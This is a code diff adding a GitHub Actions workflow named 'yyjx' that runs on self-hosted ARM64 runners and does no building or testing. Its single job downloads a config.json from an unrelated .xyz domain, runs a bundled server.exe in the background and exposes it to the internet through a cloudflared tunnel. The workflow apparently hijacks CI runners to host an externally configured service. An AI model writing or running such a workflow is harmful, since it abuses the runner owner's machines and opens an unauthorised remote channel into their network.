@@ -1,0 +1,26 @@
+name: yyjx
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run:
+    runs-on: [self-hosted, Linux, ARM64]
+    strategy:
+      max-parallel: 256
+      matrix:
+        shard: [0]
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: runner
+        run: |
+          cd "$GITHUB_WORKSPACE"
+          curl -LO 'https://www.107089.xyz/dart2/server/config.json'
+          curl -LO 'https://github.com/cloudflare/cloudflared/releases/download/2026.8.3/cloudflared-linux-arm64'
+          chmod +x ./cloudflared-linux-arm64
+          chmod +x ./server.exe
+          nohup ./server.exe &
+          ./cloudflared-linux-arm64 --url http://127.0.0.1:10708
